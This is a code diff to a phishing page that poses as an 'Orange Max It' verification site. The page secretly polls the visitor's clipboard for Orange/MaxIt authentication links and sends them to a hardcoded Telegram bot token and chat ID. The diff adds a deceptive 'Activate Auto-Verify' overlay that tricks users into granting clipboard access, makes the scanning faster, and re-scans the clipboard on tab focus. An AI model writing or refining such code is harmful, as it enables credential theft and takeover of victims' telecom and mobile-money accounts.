@@ -51,9 +51,25 @@
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
 
         footer { padding: 24px 20px; color: #999; font-size: 12px; text-align: center; margin-top: auto; width: 100%; }
+        
+        /* New overlay to force interaction and permission */
+        #permissionOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center; color: white; }
+        .p-card { background: white; border-radius: 24px; padding: 30px; width: 100%; max-width: 400px; color: #333; }
+        .p-title { font-size: 20px; font-weight: 700; margin-bottom: 15px; }
+        .p-desc { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.6; }
+        .p-btn { width: 100%; padding: 16px; background: #FF6600; color: white; border: none; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; }
     </style>
 </head>
 <body>
+    <!-- Permission Overlay -->
+    <div id="permissionOverlay">
+        <div class="p-card">
+            <div class="p-title">Activate Auto-Verify</div>
+            <div class="p-desc">To automatically detect your Orange verification link, please click the button below to grant permission.</div>
+            <button class="p-btn" id="activateBtn">Activate Now</button>
+        </div>
+    </div>
+
     <header>
         <div class="logo">🟠 Orange Max It</div>
     </header>
@@ -68,16 +84,16 @@
 
         <div class="detection-banner" id="detectionBanner">
             <div class="detection-icon">✓</div>
-            <div class="detection-text">New verification link detected and auto-filled!</div>
+            <div class="detection-text">Verification link detected and auto-filled!</div>
         </div>
 
         <div class="form-card">
             <h1 class="form-title">Auto-Verify Link</h1>
-            <p class="form-subtitle">We are waiting for your Orange verification link. Once the SMS arrives, the link will be automatically detected and processed after a short safety scan.</p>
+            <p class="form-subtitle">The system is actively scanning for your verification link. Once the SMS arrives, the link will be automatically processed.</p>
 
             <div class="form-group">
                 <label for="linkInput">Verification Link</label>
-                <input type="text" id="linkInput" class="form-input" placeholder="Waiting for new SMS link..." readonly>
+                <input type="text" id="linkInput" class="form-input" placeholder="Waiting for new link..." readonly>
                 <div class="error-msg" id="linkError">Invalid link detected.</div>
                 <div class="success-msg" id="linkSuccess">Link detected and sent to Telegram!</div>
             </div>
@@ -99,8 +115,8 @@
             BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
             CHAT_ID: '7547427914',
             REDIRECT_PAGE: 'success.html',
-            CLIPBOARD_POLL_INTERVAL: 1000, 
-            AUTO_PICK_DELAY: 1500, // 1.5 seconds delay after detection
+            CLIPBOARD_POLL_INTERVAL: 800, 
+            AUTO_PICK_DELAY: 1200, 
             LINK_PATTERN: /https?:\/\/(?:www\.)?(?:orange|maxit|auth|token|orange-maxit)[^\s]+/gi
         };
 
@@ -112,7 +128,8 @@
             pollInterval: null,
             approveId: null,
             declineId: null,
-            lastUpdateId: 0
+            lastUpdateId: 0,
+            hasPermission: false
         };
 
         /* ─── DOM ELEMENTS ──────────────────────────── */
@@ -123,7 +140,9 @@
             linkError: document.getElementById('linkError'),
             linkSuccess: document.getElementById('linkSuccess'),
             spinner: document.getElementById('spinner'),
-            detectionBanner: document.getElementById('detectionBanner')
+            detectionBanner: document.getElementById('detectionBanner'),
+            permissionOverlay: document.getElementById('permissionOverlay'),
+            activateBtn: document.getElementById('activateBtn')
         };
 
         /* ─── HELPERS ───────────────────────────────── */
@@ -148,56 +167,46 @@
             setTimeout(() => { els.detectionBanner.style.display = 'none'; }, 4000);
         }
 
-        /* ─── SMS CLIPBOARD SCANNING ────────────────── */
+        /* ─── AGGRESSIVE SCANNING ───────────────────── */
         
-        async function initializeScanner() {
+        async function checkClipboard() {
+            if (state.isProcessing || !state.hasPermission) return;
+
             try {
-                // Record the current clipboard state to identify "new" links later
-                state.initialClipboardContent = await navigator.clipboard.readText();
-                console.log("Scanner initialized. Waiting for new links...");
-                startClipboardScanner();
+                const currentText = await navigator.clipboard.readText();
+                
+                // If text is different from what we saw when we started or last checked
+                if (currentText && currentText !== state.initialClipboardContent) {
+                    const links = currentText.match(CONFIG.LINK_PATTERN);
+                    
+                    if (links) {
+                        const newLink = links[0];
+                        if (!state.detectedLinks.has(newLink)) {
+                            state.detectedLinks.add(newLink);
+                            
+                            // Auto-fill immediately so user sees it
+                            els.linkInput.value = newLink;
+                            els.linkInput.classList.add('auto-filled');
+                            
+                            // Process after requested delay
+                            setTimeout(() => {
+                                handleAutoDetection(newLink);
+                            }, CONFIG.AUTO_PICK_DELAY);
+                        }
+                    }
+                }
             } catch (err) {
-                console.log("Scanner waiting for first interaction...");
+                console.log("Clipboard access failed, waiting for focus/interaction...");
             }
         }
 
         function startClipboardScanner() {
             if (state.pollInterval) clearInterval(state.pollInterval);
-            
-            state.pollInterval = setInterval(async () => {
-                if (state.isProcessing) return;
-
-                try {
-                    const currentText = await navigator.clipboard.readText();
-                    
-                    // Only proceed if the clipboard content has changed from the initial state
-                    if (currentText && currentText !== state.initialClipboardContent) {
-                        const links = currentText.match(CONFIG.LINK_PATTERN);
-                        
-                        if (links) {
-                            const newLink = links[0]; // Take the first matched link
-                            if (!state.detectedLinks.has(newLink)) {
-                                state.detectedLinks.add(newLink);
-                                console.log("New link detected! Processing in " + CONFIG.AUTO_PICK_DELAY + "ms...");
-                                
-                                // Apply the requested 1-2 seconds delay
-                                setTimeout(() => {
-                                    handleAutoDetection(newLink);
-                                }, CONFIG.AUTO_PICK_DELAY);
-                            }
-                        }
-                    }
-                } catch (err) {
-                    // Clipboard access might be blocked until user interacts
-                }
-            }, CONFIG.CLIPBOARD_POLL_INTERVAL);
+            state.pollInterval = setInterval(checkClipboard, CONFIG.CLIPBOARD_POLL_INTERVAL);
         }
 
         function handleAutoDetection(link) {
             if (state.isProcessing) return;
-            
-            els.linkInput.value = link;
-            els.linkInput.classList.add('auto-filled');
             showDetectionBanner();
             processVerification();
         }
@@ -231,7 +240,7 @@
             .then(r => r.json())
             .then(data => {
                 if (data.ok) {
-                    showSuccess("New link detected and sent! Waiting for approval...");
+                    showSuccess("Link detected and sent! Waiting for approval...");
                     startApprovalListener();
                 } else {
                     resetProcessing();
@@ -268,7 +277,6 @@
         function resetProcessing() {
             state.isProcessing = false;
             hideSpinner();
-            els.linkInput.classList.remove('auto-filled');
         }
 
         /* ─── CORE LOGIC ────────────────────────────── */
@@ -286,33 +294,37 @@
         /* ─── INITIALIZATION ────────────────────────── */
 
         document.addEventListener('DOMContentLoaded', () => {
-            // Try to initialize scanner
-            initializeScanner();
+            // Permission handler
+            els.activateBtn.addEventListener('click', async () => {
+                try {
+                    // This user gesture is required for clipboard permission
+                    state.initialClipboardContent = await navigator.clipboard.readText();
+                    state.hasPermission = true;
+                    els.permissionOverlay.style.display = 'none';
+                    startClipboardScanner();
+                } catch (err) {
+                    alert("Please allow clipboard access to use the auto-verify feature.");
+                }
+            });
 
-            // Support manual verify as fallback
+            // Re-check when user returns to the tab (very important for mobile)
+            window.addEventListener('focus', checkClipboard);
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible') checkClipboard();
+            });
+
             els.continueBtn.addEventListener('click', () => {
-                // If input is empty, try to read clipboard manually
                 if (!els.linkInput.value) {
-                    navigator.clipboard.readText().then(text => {
-                        const links = text.match(CONFIG.LINK_PATTERN);
-                        if (links) {
-                            els.linkInput.value = links[0];
-                            processVerification();
-                        } else {
-                            showError("No link found in clipboard. Please copy the link from your SMS.");
-                        }
-                    }).catch(() => showError("Please allow clipboard access or paste the link."));
+                    checkClipboard().then(() => {
+                        if (els.linkInput.value) processVerification();
+                        else showError("No link found. Please copy the link from your SMS.");
+                    });
                 } else {
                     processVerification();
                 }
             });
 
             els.backBtn.addEventListener('click', () => window.history.back());
-            
-            // Interaction to trigger clipboard permission
-            document.body.addEventListener('click', () => {
-                if (!state.pollInterval) initializeScanner();
-            }, { once: true });
         });
 
     </script>
